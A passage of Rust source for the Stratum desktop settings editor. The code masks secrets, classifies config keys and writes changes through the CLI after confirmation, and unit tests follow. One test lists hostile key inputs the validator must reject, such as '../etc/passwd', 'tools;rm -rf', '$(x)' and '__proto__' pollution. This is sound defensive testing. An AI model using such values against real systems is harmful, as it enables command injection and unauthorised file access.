                if clean_text(s, 1024)
                    && (s.starts_with("~/")
                        || s.starts_with("~\\")
                        || std::path::Path::new(s).is_absolute()
                        || s.starts_with('/')) =>
            {
                Ok(value.clone())
            }
            _ => Err(wrong("tiene que ser una ruta absoluta o empezar por ~/.")),
        },
    }
}

/// Una dirección sin credenciales ni parámetros: `user:pass@` y `?query` se tapan.
pub fn safe_url(url: &str) -> String {
    let (head, tail) = match url.split_once("://") {
        Some((scheme, rest)) => (format!("{scheme}://"), rest),
        None => (String::new(), url),
    };
    let (authority, path) = match tail.find('/') {
        Some(i) => (&tail[..i], &tail[i..]),
        None => (tail, ""),
    };
    let authority = match authority.rsplit_once('@') {
        Some((_, host)) => format!("••••@{host}"),
        None => authority.to_string(),
    };
    let path = match path.split_once('?') {
        Some((p, _)) => format!("{p}?••••"),
        None => path.to_string(),
    };
    let authority = match authority.split_once('?') {
        Some((a, _)) => format!("{a}?••••"),
        None => authority,
    };
    clip(&format!("{head}{authority}{path}"), 300)
}

/// Un secreto, como lo ve el webview: si está y de dónde sale. Nunca su valor.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SecretView {
    pub set: bool,
    /// Si es `${VAR}`: el nombre de la variable (no es secreto).
    pub env_var: Option<String>,
}

fn secret_view(raw: Option<&Value>) -> SecretView {
    match raw.and_then(Value::as_str) {
        Some(s) if !s.is_empty() => SecretView {
            set: true,
            env_var: pure_env_ref(s).map(str::to_string),
        },
        _ => SecretView {
            set: false,
            env_var: None,
        },
    }
}

/// Cómo se enseña un valor en la ventana de confirmación.
fn display(kind: Kind, value: Option<&Value>) -> String {
    match value {
        None | Some(Value::Null) => "(sin definir)".into(),
        Some(Value::Bool(b)) => if *b { "sí" } else { "no" }.into(),
        Some(Value::String(s)) if s.is_empty() => "(vacío)".into(),
        Some(Value::String(s)) => match kind {
            Url => safe_url(s),
            _ => clip(s, 200),
        },
        Some(other) => clip(&other.to_string(), 200),
    }
}

// ---------------------------------------------------------------------------
// Lo que ve el webview
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct FieldView {
    pub path: String,
    pub label: String,
    pub hint: String,
    pub kind: &'static str,
    pub options: Vec<&'static str>,
    pub min: Option<f64>,
    pub max: Option<f64>,
    pub level: Level,
    /// El valor efectivo (el del fichero o, si no lo fija, el por defecto). `null` en un secreto.
    pub value: Value,
    pub default: Value,
    pub is_default: bool,
    pub restart: Restart,
    pub secret: Option<SecretView>,
    /// Por qué no se puede editar aquí (usa una variable de entorno, otro tipo…).
    pub locked: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SectionView {
    pub id: &'static str,
    pub title: &'static str,
    pub intro: &'static str,
    pub fields: Vec<FieldView>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ProviderView {
    pub alias: String,
    pub is_default: bool,
    pub base_url: Option<String>,
    pub model: String,
    pub context_window: Option<i64>,
    pub api_key: SecretView,
}

/// Cómo se pinta y de qué nivel es cada campo de un provider (el nombre es el
/// último tramo de la clave: `baseUrl`, `model`…).
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ProviderFieldMeta {
    pub name: String,
    pub label: String,
    pub hint: String,
    pub kind: &'static str,
    pub min: Option<f64>,
    pub max: Option<f64>,
    pub level: Level,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CliOnlyView {
    pub title: &'static str,
    /// Hay algo definido en el fichero. Nunca se dice qué.
    pub present: bool,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SettingsView {
    pub config_path: String,
    /// `ready` · `readOnly`.
    pub state: &'static str,
    /// Por qué está en solo lectura.
    pub reason: Option<String>,
    /// `ok` · `missing` · `outdated` · `broken` · `newer`.
    pub cli: &'static str,
    pub default_provider: Option<String>,
    pub providers: Vec<ProviderView>,
    pub provider_fields: Vec<ProviderFieldMeta>,
    pub sections: Vec<SectionView>,
    pub cli_only: Vec<CliOnlyView>,
}

fn pointer<'a>(root: &'a Value, segments: &[String]) -> Option<&'a Value> {
    let mut current = root;
    for segment in segments {
        current = current.as_object()?.get(segment)?;
    }
    (!current.is_null()).then_some(current)
}

fn split(path: &str) -> Vec<String> {
    path.split('.').map(str::to_string).collect()
}

fn options_of(kind: Kind) -> Vec<&'static str> {
    match kind {
        Enum(options) => options.to_vec(),
        _ => Vec::new(),
    }
}

fn bounds_of(kind: Kind) -> (Option<f64>, Option<f64>) {
    match kind {
        Int(min, max) => (Some(min as f64), Some(max as f64)),
        Num(min, max) => (Some(min), Some(max)),
        _ => (None, None),
    }
}

/// Por qué un valor del fichero no se puede editar con el formulario.
fn locked_reason(spec: &Spec, raw: Option<&Value>) -> Option<String> {
    let raw = raw?;
    if matches!(spec.kind, Secret) {
        return None;
    }
    let env = raw.as_str().is_some_and(|s| s.contains("${"));
    let text_like = matches!(spec.kind, Text(_) | Url | Folder | Alias);
    if env && !text_like {
        return Some("Usa una variable de entorno: edítalo con `stratum config`.".into());
    }
    // Un texto con `${VAR}` se conserva literal: se expande al cargar, no aquí.
    if env {
        return None;
    }
    match check_value(spec, raw) {
        Ok(_) => None,
        Err(_) => {
            Some("Tiene un valor que este editor no entiende: edítalo con `stratum config`.".into())
        }
    }
}

fn field(
    spec: &Spec,
    path: &str,
    label: String,
    raw: &Value,
    defaults: &Value,
    read_only: bool,
) -> FieldView {
    let segments = split(path);
    let from_file = pointer(raw, &segments);
    let default = pointer(defaults, &segments).cloned().unwrap_or(Value::Null);
    let (min, max) = bounds_of(spec.kind);
    let secret = matches!(spec.kind, Secret).then(|| secret_view(from_file));
    let locked = if read_only {
        None
    } else {
        locked_reason(spec, from_file)
    };
    let value = if secret.is_some() {
        Value::Null
    } else {
        match from_file {
            Some(Value::String(s)) if matches!(spec.kind, Url) => json!(safe_url(s)),
            Some(v) => v.clone(),
            None => default.clone(),
        }
    };
    FieldView {
        path: path.to_string(),
        label,
        hint: spec.hint.to_string(),
        kind: spec.kind.name(),
        options: options_of(spec.kind),
        min,
        max,
        level: spec.level,
        value,
        default: if secret.is_some() {
            Value::Null
        } else {
            default
        },
        is_default: secret.as_ref().map_or(from_file.is_none(), |s| !s.set),
        restart: restart_of(&segments),
        secret,
        locked,
    }
}

fn names_in(raw: &Value, path: &str) -> Vec<String> {
    let mut names: Vec<String> = pointer(raw, &split(path))
        .and_then(Value::as_object)
        .map(|m| m.keys().filter(|k| is_name(k)).cloned().collect())
        .unwrap_or_default();
    names.sort();
    names
}

fn provider_fields() -> Vec<ProviderFieldMeta> {
    SPECS
        .iter()
        .filter(|s| s.section == "providers")
        .map(|s| {
            let (min, max) = bounds_of(s.kind);
            ProviderFieldMeta {
                name: s.path.rsplit('.').next().unwrap_or_default().to_string(),
                label: s.label.to_string(),
                hint: s.hint.to_string(),
                kind: s.kind.name(),
                min,
                max,
                level: s.level,
            }
        })
        .collect()
}

/// Arma lo que ve el webview a partir del JSON crudo y los valores por defecto.
pub fn build_view(
    raw: &Value,
    defaults: &Value,
    config_path: &str,
    read_only: Option<(&'static str, String)>,
) -> SettingsView {
    let locked = read_only.is_some();
    let default_provider = pointer(raw, &split("provider.default"))
        .and_then(Value::as_str)
        .map(str::to_string);
    let providers = names_in(raw, "provider.providers")
        .into_iter()
        .map(|alias| {
            let at = |field: &str| split(&format!("provider.providers.{alias}.{field}"));
            let entry = |f: &str| pointer(raw, &at(f));
            ProviderView {
                is_default: default_provider.as_deref() == Some(alias.as_str()),
                base_url: entry("baseUrl").and_then(Value::as_str).map(safe_url),
                model: entry("model")
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_string(),
                context_window: entry("contextWindow").and_then(Value::as_i64),
                api_key: secret_view(entry("apiKey")),
                alias,
            }
        })
        .collect();

    let mut sections = Vec::new();
    for (id, title, intro) in SECTIONS {
        let mut fields = Vec::new();
        if *id == "environments" {
            for name in names_in(raw, "environments") {
                for spec in SPECS.iter().filter(|s| s.section == "environments") {
                    let path = spec.path.replace('*', &name);
                    fields.push(field(
                        spec,
                        &path,
                        format!("{name} · {}", spec.label),
                        raw,
                        defaults,
                        locked,
                    ));
                }
            }
        } else {
            for spec in SPECS
                .iter()
                .filter(|s| s.section == *id && !s.path.contains('*'))
            {
                fields.push(field(
                    spec,
                    spec.path,
                    spec.label.to_string(),
                    raw,
                    defaults,
                    locked,
                ));
            }
        }
        if !fields.is_empty() || *id == "environments" {
            sections.push(SectionView {
                id,
                title,
                intro,
                fields,
            });
        }
    }

    let cli_only = CLI_ONLY
        .iter()
        .map(|(title, paths)| CliOnlyView {
            title,
            present: paths.iter().any(|p| {
                if p.contains('*') {
                    let (before, after) = p.split_once(".*.").unwrap_or((p, ""));
                    names_in(raw, before).iter().any(|name| {
                        pointer(raw, &split(&format!("{before}.{name}.{after}"))).is_some()
                    })
                } else {
                    pointer(raw, &split(p)).is_some()
                }
            }),
        })
        .collect();

    let (cli, reason) = match &read_only {
        Some((cli, reason)) => (*cli, Some(reason.clone())),
        None => ("ok", None),
    };
    SettingsView {
        config_path: config_path.to_string(),
        state: if locked { "readOnly" } else { "ready" },
        reason,
        cli,
        default_provider,
        providers,
        provider_fields: provider_fields(),
        sections,
        cli_only,
    }
}

// ---------------------------------------------------------------------------
// Hablar con la CLI
// ---------------------------------------------------------------------------

struct Snapshot {
    raw: Value,
    defaults: Value,
    path: String,
    writable: bool,
}

enum Unusable {
    Missing,
    Outdated,
    Broken(String),
}

fn is_old_cli(stderr: &str) -> bool {
    let lower = stderr.to_lowercase();
    [
        "unknown option",
        "unknown command",
        "too many arguments",
        "excess arguments",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

const UPDATE_CLI: &str =
    "Tu CLI de Stratum es anterior a los ajustes editables: actualiza la CLI (`npm install -g stratum-cli`).";

fn read_snapshot(cli: &dyn CliRunner) -> Result<Snapshot, Unusable> {
    let output = match cli.run(&["config", "list", "--global", "--json"], None) {
        Ok(output) => output,
        Err(CliError::NotFound) => return Err(Unusable::Missing),
        Err(CliError::Timeout) => {
            return Err(Unusable::Broken(
                "La CLI de Stratum no contestó a tiempo.".into(),
            ))
        }
        Err(CliError::Io(e)) => {
            return Err(Unusable::Broken(format!(
                "No se pudo ejecutar la CLI de Stratum: {e}"
            )))
        }
        Err(CliError::Failed { stderr }) if is_old_cli(&stderr) => return Err(Unusable::Outdated),
        Err(CliError::Failed { stderr }) => {
            return Err(Unusable::Broken(if stderr.trim().is_empty() {
                "La CLI de Stratum no pudo leer la configuración.".into()
            } else {
                clip(stderr.trim(), 400)
            }))
        }
    };
    let parsed: Value =
        serde_json::from_str(output.stdout.trim()).map_err(|_| Unusable::Outdated)?;
    if parsed["format"] != json!(1) {
        return Err(Unusable::Outdated);
    }
    let raw = parsed["raw"].clone();
    if !raw.is_object() || !parsed["defaults"].is_object() {
        return Err(Unusable::Outdated);
    }
    Ok(Snapshot {
        raw,
        defaults: parsed["defaults"].clone(),
        path: parsed["path"].as_str().unwrap_or_default().to_string(),
        writable: parsed["writable"].as_bool() == Some(true),
    })
}

fn unusable_message(unusable: &Unusable) -> (&'static str, String) {
    match unusable {
        Unusable::Missing => (
            "missing",
            "No se encuentra la CLI de Stratum (`stratum`). Instálala (`npm install -g stratum-cli`) para editar la configuración desde aquí.".into(),
        ),
        Unusable::Outdated => ("outdated", UPDATE_CLI.into()),
        Unusable::Broken(message) => ("broken", message.clone()),
    }
}

/// La config global cruda leída por Rust, solo para enseñarla cuando la CLI no
/// sirve. Tolerante: lo que no se pueda leer es `{}`.
fn read_raw_fallback(path: &Path) -> Value {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|text| {
            serde_json::from_str::<Value>(text.strip_prefix('\u{feff}').unwrap_or(&text)).ok()
        })
        .filter(Value::is_object)
        .unwrap_or_else(|| json!({}))
}

/// Lo que ve el editor ahora. Nunca falla: sin una CLI que sirva, es de solo lectura.
pub fn load_view(cli: &dyn CliRunner, config_path: &Path) -> SettingsView {
    match read_snapshot(cli) {
        Ok(snapshot) if snapshot.writable => build_view(&snapshot.raw, &snapshot.defaults, &snapshot.path, None),
        Ok(snapshot) => build_view(
            &snapshot.raw,
            &snapshot.defaults,
            &snapshot.path,
            Some((
                "newer",
                "El fichero de configuración es de un Stratum más nuevo: no se edita desde aquí. Actualiza Stratum.".into(),
            )),
        ),
        Err(unusable) => {
            let (cli_state, reason) = unusable_message(&unusable);
            build_view(
                &read_raw_fallback(config_path),
                &Value::Null,
                &config_path.to_string_lossy(),
                Some((cli_state, reason)),
            )
        }
    }
}

fn usable(cli: &dyn CliRunner) -> Result<Snapshot, CommandError> {
    match read_snapshot(cli) {
        Ok(snapshot) if snapshot.writable => Ok(snapshot),
        Ok(_) => Err(rejected(
            "El fichero de configuración es de un Stratum más nuevo: no se edita desde aquí.",
        )),
        Err(unusable) => Err(rejected(unusable_message(&unusable).1)),
    }
}

// ---------------------------------------------------------------------------
// Cambiar un ajuste
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ChangeOutcome {
    pub view: SettingsView,
    /// Hubo un cambio que escribir (`false`: ya valía eso).
    pub changed: bool,
    pub restart: Option<Restart>,
}

fn write_failure(failure: CliError, secrets: &[&str]) -> CommandError {
    match failure {
        CliError::Failed { stderr } => rejected(format!(
            "La CLI de Stratum no ha aceptado el cambio y el fichero sigue como estaba: {}",
            scrub(&stderr, secrets)
        )),
        CliError::NotFound => rejected(unusable_message(&Unusable::Missing).1),
        CliError::Timeout => error(
            CommandErrorKind::Unknown,
            "La CLI de Stratum no contestó a tiempo: no se sabe si el cambio llegó a escribirse. Vuelve a abrir Ajustes para comprobarlo.",
        ),
        CliError::Io(e) => error(
            CommandErrorKind::NotSent,
            format!("No se pudo ejecutar la CLI de Stratum: {}", scrub(&e, secrets)),
        ),
    }
}

fn write_value(
    cli: &dyn CliRunner,
    key: &str,
    value: &Value,
    secrets: &[&str],
) -> Result<(), CommandError> {
    cli.run(
        &["config", "set", "--global", "--json", "--stdin", key],
        Some(&value.to_string()),
    )
    .map(|_| ())
    .map_err(|e| write_failure(e, secrets))
}

fn changed_while_confirming() -> CommandError {
    rejected("El valor cambió mientras confirmabas. No se ha escrito nada: revisa el valor actual y vuelve a intentarlo.")
}

/// Cambia una clave editable. El nivel B solo se escribe tras confirmar, y si
/// el valor sigue siendo el que se enseñó.
pub fn apply_set(
    cli: &dyn CliRunner,
    confirmer: &dyn Confirmer,
    config_path: &Path,
    key: &str,
    value: &Value,
) -> Result<ChangeOutcome, CommandError> {
    let segments = normalize_key(key)?;
    let Class::Editable(spec) = classify(&segments) else {
        return Err(rejected(
            "Esa clave no se edita desde Desktop: edítala con `stratum config`.",
        ));
    };
    let canonical = check_value(spec, value)?;
    let snapshot = usable(cli)?;
    let before = pointer(&snapshot.raw, &segments).cloned();

    // Lo que se edita ya existe: un alias o un entorno no se crea escribiendo uno de sus campos.
    for (i, part) in spec.path.split('.').enumerate() {
        if part == "*" {
            let parent = segments[..i].join(".");
            if !names_in(&snapshot.raw, &parent).contains(&segments[i]) {
                return Err(invalid("Ese elemento no existe en la configuración."));
            }
        }
    }
    if matches!(spec.kind, Alias)
        && !canonical.as_str().is_some_and(|a| {
            names_in(&snapshot.raw, "provider.providers")
                .iter()
                .any(|n| n == a)
        })
    {
        return Err(invalid("Ese provider no está configurado."));
    }
    if let Some(reason) = locked_reason(spec, before.as_ref()) {
        return Err(rejected(reason));
    }
    if before.as_ref() == Some(&canonical) {
        return Ok(ChangeOutcome {
            view: load_view(cli, config_path),
            changed: false,
            restart: None,
        });
    }

    let new_text = canonical.as_str().unwrap_or("");
    let secrets = [new_text];
    let to_scrub: &[&str] = if matches!(spec.kind, Secret) {
        &secrets
    } else {
        &[]
    };
    if spec.level == Level::B {
        let request = confirm_request(spec, key, &segments, &snapshot, before.as_ref(), &canonical);
        confirmer.confirm(&request)?;
        // Mientras la ventana estaba abierta pudo cambiar (la CLI, otro Desktop, a mano).
        let again = usable(cli)?;
        if pointer(&again.raw, &segments) != before.as_ref() {
            return Err(changed_while_confirming());
        }
    }
    write_value(cli, key, &canonical, to_scrub)?;
    Ok(ChangeOutcome {
        view: load_view(cli, config_path),
        changed: true,
        restart: Some(restart_of(&segments)),
    })
}

fn confirm_request(
    spec: &Spec,
    key: &str,
    segments: &[String],
    snapshot: &Snapshot,
    before: Option<&Value>,
    after: &Value,
) -> ConfirmRequest {
    let owner = spec
        .path
        .split('.')
        .position(|p| p == "*")
        .map(|i| segments[i].clone());
    let label = match &owner {
        Some(name) => format!("{} · {name}", spec.label),
        None => spec.label.to_string(),
    };
    if matches!(spec.kind, Secret) {
        let what = match (&owner, spec.path.starts_with("provider.")) {
            (Some(name), true) => format!("Se cambiará la clave de API del provider «{name}»."),
            _ => format!("Se cambiará la clave «{}».", spec.label),
        };
        let note = match after.as_str().and_then(pure_env_ref) {
            Some(var) => format!("{what} Se leerá de la variable de entorno {var}."),
            None => format!("{what} El valor no se muestra."),
        };
        return ConfirmRequest {
            label,
            key: key.to_string(),
            old: None,
            new: None,
            note: Some(note),
        };
    }
    let old = match before {
        Some(v) => display(spec.kind, Some(v)),
        None => {
            let default = pointer(&snapshot.defaults, segments);
            format!("{} (por defecto)", display(spec.kind, default))
        }
    };
    ConfirmRequest {
        label,
        key: key.to_string(),
        old: Some(old),
        new: Some(display(spec.kind, Some(after))),
        note: (!spec.hint.is_empty()).then(|| spec.hint.to_string()),
    }
}

/// Lo que pide el formulario de «añadir provider».
#[derive(Debug, Clone, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct NewProvider {
    pub alias: String,
    pub base_url: String,
    pub api_key: String,
    pub model: String,
    pub make_default: bool,
}

/// Añade un provider nuevo (siempre nivel B: una dirección y una clave).
pub fn apply_add_provider(
    cli: &dyn CliRunner,
    confirmer: &dyn Confirmer,
    config_path: &Path,
    new: &NewProvider,
) -> Result<ChangeOutcome, CommandError> {
    if !is_name(&new.alias) {
        return Err(invalid(
            "El alias solo admite letras, números, - y _ (hasta 32).",
        ));
    }
    let url_spec = spec_for("provider.providers.*.baseUrl");
    let key_spec = spec_for("provider.providers.*.apiKey");
    let model_spec = spec_for("provider.providers.*.model");
    let base_url = check_value(url_spec, &json!(new.base_url))?;
    let api_key = check_value(key_spec, &json!(new.api_key))?;
    let model = check_value(model_spec, &json!(new.model))?;

    let snapshot = usable(cli)?;
    let exists = |raw: &Value| names_in(raw, "provider.providers").contains(&new.alias);
    if exists(&snapshot.raw) {
        return Err(invalid("Ya hay un provider con ese alias."));
    }

    let key_text = api_key.as_str().unwrap_or("");
    let note = match pure_env_ref(key_text) {
        Some(var) => format!("La clave se leerá de la variable de entorno {var}."),
        None if key_text.is_empty() => "Sin clave de API.".to_string(),
        None => "Se guardará su clave de API. El valor no se muestra.".to_string(),
    };
    confirmer.confirm(&ConfirmRequest {
        label: format!("Añadir el provider «{}»", new.alias),
        key: format!("provider.providers.{}", new.alias),
        old: None,
        new: Some(format!(
            "{} · modelo {}",
            safe_url(base_url.as_str().unwrap_or("")),
            display(Text(128), Some(&model))
        )),
        note: Some(note),
    })?;
    let again = usable(cli)?;
    if exists(&again.raw)
        || pointer(&again.raw, &split("provider")).is_some()
            != pointer(&snapshot.raw, &split("provider")).is_some()
    {
        return Err(changed_while_confirming());
    }

    let mut entry = Map::new();
    entry.insert("type".into(), json!("openai-compatible"));
    entry.insert("baseUrl".into(), base_url);
    if !model.as_str().unwrap_or("").is_empty() {
        entry.insert("model".into(), model);
    }
    if !key_text.is_empty() {
        entry.insert("apiKey".into(), api_key.clone());
    }
    let secrets = [key_text];
    let has_provider = pointer(&snapshot.raw, &split("provider")).is_some();
    if has_provider {
        write_value(
            cli,
            &format!("provider.providers.{}", new.alias),
            &Value::Object(entry),
            &secrets,
        )?;
        if new.make_default {
            write_value(cli, "provider.default", &json!(new.alias), &secrets).map_err(|e| {
                rejected(format!(
                    "El provider se añadió, pero no se pudo fijar como predeterminado: {}",
                    e.message
                ))
            })?;
        }
    } else {
        // Sin bloque `provider`, el esquema exige `default` y `providers` juntos.
        let block = json!({ "default": new.alias, "providers": { new.alias.clone(): Value::Object(entry) } });
        write_value(cli, "provider", &block, &secrets)?;
    }
    Ok(ChangeOutcome {
        view: load_view(cli, config_path),
        changed: true,
        restart: Some(Restart::Session),
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::cell::RefCell;

    // --- Una CLI falsa con un «fichero» en memoria ---------------------------------------

    struct FakeCli {
        raw: RefCell<Value>,
        writable: bool,
        calls: RefCell<Vec<(Vec<String>, Option<String>)>>,
        /// Si está, el siguiente `set` falla con este mensaje.
        fail_set: RefCell<Option<CliError>>,
        /// Respuesta fija a `list` (CLI ausente, vieja…).
        list_error: RefCell<Option<CliError>>,
    }

    impl FakeCli {
        fn new(raw: Value) -> Self {
            Self {
                raw: RefCell::new(raw),
                writable: true,
                calls: RefCell::new(Vec::new()),
                fail_set: RefCell::new(None),
                list_error: RefCell::new(None),
            }
        }

        fn writes(&self) -> Vec<(String, String)> {
            self.calls
                .borrow()
                .iter()
                .filter(|(args, _)| args.get(1).map(String::as_str) == Some("set"))
                .map(|(args, stdin)| {
                    (
                        args.last().cloned().unwrap_or_default(),
                        stdin.clone().unwrap_or_default(),
                    )
                })
                .collect()
        }
    }

    fn defaults() -> Value {
        json!({
            "logging": { "level": "info", "redact": true },
            "tools": { "confirmDestructive": true, "bashTimeout": 30000 },
            "desktop": { "notifications": { "enabled": true, "minSeconds": 10 }, "globalHotkey": "CommandOrControl+Shift+Space" },
            "context": { "maxTokens": "auto" },
        })
    }

    impl CliRunner for FakeCli {
        fn run(&self, args: &[&str], stdin: Option<&str>) -> Result<CliOutput, CliError> {
            self.calls.borrow_mut().push((
                args.iter().map(|s| s.to_string()).collect(),
                stdin.map(str::to_string),
            ));
            if args.get(1) == Some(&"list") {
                if let Some(error) = self.list_error.borrow().clone() {
                    return Err(error);
                }
                return Ok(CliOutput {
                    stdout: json!({
                        "format": 1, "path": "/home/ana/.stratum/.stratumrc.json", "exists": true,
                        "supportedSchemaVersion": 1, "writable": self.writable,
                        "raw": *self.raw.borrow(), "defaults": defaults(),
                    })
                    .to_string(),
                });
            }
            if let Some(error) = self.fail_set.borrow_mut().take() {
                return Err(error);
            }
            // set --global --json --stdin <clave>
            let key = args.last().unwrap();
            let value: Value = serde_json::from_str(stdin.unwrap()).unwrap();
            let mut raw = self.raw.borrow_mut();
            let mut current = &mut *raw;
            let parts: Vec<&str> = key.split('.').collect();
            for part in &parts[..parts.len() - 1] {
                if !current[*part].is_object() {
                    current[*part] = json!({});
                }
                current = &mut current[*part];
            }
            current[parts[parts.len() - 1]] = value;
            Ok(CliOutput {
                stdout: String::new(),
            })
        }
    }

    struct Ask<'a> {
        answer: Result<(), CommandError>,
        seen: RefCell<Vec<ConfirmRequest>>,
        /// Se ejecuta mientras «la ventana está abierta».
        meanwhile: Option<&'a dyn Fn()>,
    }

    impl<'a> Ask<'a> {
        fn yes() -> Self {
            Self {
                answer: Ok(()),
                seen: RefCell::new(Vec::new()),
                meanwhile: None,
            }
        }
        fn no(reason: &str) -> Self {
            Self {
                answer: Err(not_confirmed(reason, "No confirmado.")),
                seen: RefCell::new(Vec::new()),
                meanwhile: None,
            }
        }
    }

    impl Confirmer for Ask<'_> {
        fn confirm(&self, request: &ConfirmRequest) -> Result<(), CommandError> {
            self.seen.borrow_mut().push(request.clone());
            if let Some(f) = self.meanwhile {
                f();
            }
            self.answer.clone()
        }
    }

    fn path() -> std::path::PathBuf {
        std::path::PathBuf::from("/home/ana/.stratum/.stratumrc.json")
    }

    fn segs(key: &str) -> Vec<String> {
        key.split('.').map(str::to_string).collect()
    }

    // --- Clasificador ---------------------------------------------------------------------

    fn level_of(key: &str) -> Option<Level> {
        match classify(&normalize_key(key).ok()?) {
            Class::Editable(spec) => Some(spec.level),
            Class::CliOnly => None,
        }
    }

    #[test]
    fn niveles_a_b_y_c_por_clave() {
        assert_eq!(level_of("desktop.notifications.enabled"), Some(A));
        assert_eq!(level_of("desktop.workspaces.compressAfterDays"), Some(A));
        assert_eq!(level_of("logging.level"), Some(A));
        assert_eq!(level_of("provider.default"), Some(A));
        assert_eq!(level_of("provider.providers.local.model"), Some(A));
        assert_eq!(level_of("tools.confirmDestructive"), Some(B));
        assert_eq!(level_of("logging.redact"), Some(B));
        assert_eq!(level_of("trace.screenshots"), Some(B));
        assert_eq!(level_of("memory.session.allowRemote"), Some(B));
        assert_eq!(level_of("provider.providers.local.baseUrl"), Some(B));
        assert_eq!(level_of("provider.providers.local.apiKey"), Some(B));
        assert_eq!(level_of("environments.prod.policy"), Some(B));
        assert_eq!(level_of("daemon.approvalTimeoutMinutes"), Some(B));
        // C: ejecutan código o abren acceso.
        for key in [
            "plugins.enabled",
            "plugins",
            "mcp.servers",
            "mcp.autoInstall",
            "ssh.hosts",
            "box.image",
            "companion.mcp.servers",
            "channels.telegram.enabled",
            "imageGeneration.model",
            "lsp.enabled",
            "tools.testCommand",
            "tools.guardedCommands",
            "tools.destructivePatterns",
            "tools.sensitivePathAllowlist",
            "tools.webFetch.allowHosts",
            "tools.redaction.extraPatterns",
            "session.profiles",
            "memory.projectFile",
            "memory.vectorDb",
            "logging.file.dir",
            "trace.dir",
            "schemaVersion",
            "environments.prod.match",
            "provider.providers.local.models",
            "provider.providers.local.type",
        ] {
            assert_eq!(level_of(key), None, "{key} debería ser C");
        }
    }

    #[test]
    fn lo_desconocido_o_sin_clasificar_es_c() {
        for key in [
            "desconocida",
            "logging.nueva",
            "logging",
            "desktop",
            "tools",
            "provider",
            "provider.providers",
            "provider.providers.local",
            "Logging.level",
            "logging.Level",
            "logging.level.extra",
            "environments.prod",
            "environments.prod.tier.extra",
        ] {
            assert_eq!(level_of(key), None, "{key}");
        }
    }

    #[test]
    fn claves_hostiles_se_rechazan_antes_de_clasificar() {
        let long = "a".repeat(200);
        for key in [
            "",
            ".",
            "..",
            "a..b",
            ".logging.level",
            "logging.level.",
            "logging..level",
            "../etc/passwd",
            "logging/level",
            "logging\\level",
            "logging.level\n",
            "logging.level ",
            " logging.level",
            "logging[level]",
            "logging['level']",
            "__proto__.polluted",
            "logging.__proto__.x",
            "constructor.prototype",
            "logging.constructor",
            "a.prototype",
            "logging.léve",
            "logging.level\0",
            "tools;rm -rf",
            "tools&calc",
            "tools.confirmDestructive|x",
            "a.b.c.d.e.f.g.h.i",
            long.as_str(),
            "provider.providers.a b.model",
            "provider.providers.$(x).model",
        ] {
            assert!(normalize_key(key).is_err(), "{key:?} debería rechazarse");
        }
        assert!(normalize_key("logging.level").is_ok());
        assert!(normalize_key("provider.providers.mi-ollama_2.model").is_ok());
    }

    #[test]
    fn los_nombres_elegidos_siguen_el_patron_de_entorno() {
        assert!(is_name("local"));
        assert!(is_name("a1_-"));
        assert!(!is_name(""));
        assert!(!is_name("-a"));
        assert!(!is_name("con.punto"));
        assert!(!is_name(&"x".repeat(33)));
        // Un alias con un patrón raro no es editable aunque el prefijo lo sea.
        assert_eq!(level_of("provider.providers.-x.model"), None);
    }

    #[test]
    fn la_lista_cerrada_no_se_cuela_por_los_prefijos_prohibidos() {
        for spec in SPECS {
            let first = spec.path.split('.').next().unwrap();
            assert!(!NEVER_EDITABLE.contains(&first), "{}", spec.path);
            assert!(spec.path.split('.').all(|p| p == "*" || !p.is_empty()));
        }
        // Todos los campos de la lista pertenecen a una sección que existe.
        for spec in SPECS {
            assert!(
                spec.section == "providers"
                    || SECTIONS.iter().any(|(id, _, _)| *id == spec.section),
                "{}",
                spec.path
            );
        }
    }

    #[test]
    fn el_reinicio_depende_de_la_clave() {
        assert_eq!(restart_of(&segs("desktop.globalHotkey")), Restart::App);
        assert_eq!(restart_of(&segs("daemon.maxSessions")), Restart::Daemon);
        assert_eq!(restart_of(&segs("logging.level")), Restart::Daemon);
        assert_eq!(restart_of(&segs("tools.bashTimeout")), Restart::Session);
    }

    // --- Valores y enmascarado ------------------------------------------------------------

    fn spec_of(key: &str) -> &'static Spec {
        match classify(&segs(key)) {
            Class::Editable(s) => s,
            Class::CliOnly => panic!("{key} no es editable"),
        }
    }

    #[test]
    fn el_valor_se_comprueba_contra_el_tipo() {
        assert!(check_value(spec_of("logging.level"), &json!("debug")).is_ok());
        assert!(check_value(spec_of("logging.level"), &json!("ruidoso")).is_err());
        assert!(check_value(spec_of("logging.level"), &json!(3)).is_err());
        assert!(check_value(spec_of("tools.confirmDestructive"), &json!("true")).is_err());
        assert!(check_value(spec_of("daemon.maxSessions"), &json!(0)).is_err());
        assert!(check_value(spec_of("daemon.maxSessions"), &json!(1.5)).is_err());
        assert_eq!(
            check_value(spec_of("daemon.maxSessions"), &json!(8.0)).unwrap(),
            json!(8)
        );
        assert!(check_value(spec_of("memory.similarityThreshold"), &json!(1.5)).is_err());
        assert!(check_value(spec_of("memory.similarityThreshold"), &json!(f64::NAN)).is_err());
        assert!(check_value(spec_of("context.maxTokens"), &json!("auto")).is_ok());
        assert!(check_value(spec_of("context.maxTokens"), &json!(8192)).is_ok());
        assert!(check_value(spec_of("context.maxTokens"), &json!("8192")).is_err());
        assert!(check_value(spec_of("tui.background"), &json!("#00ff00")).is_ok());
        assert!(check_value(spec_of("tui.background"), &json!("rojo")).is_err());
        assert!(check_value(spec_of("desktop.globalHotkey"), &json!("Ctrl+K\nrm")).is_err());
        assert!(check_value(spec_of("desktop.workspaces.root"), &json!("relativa/x")).is_err());
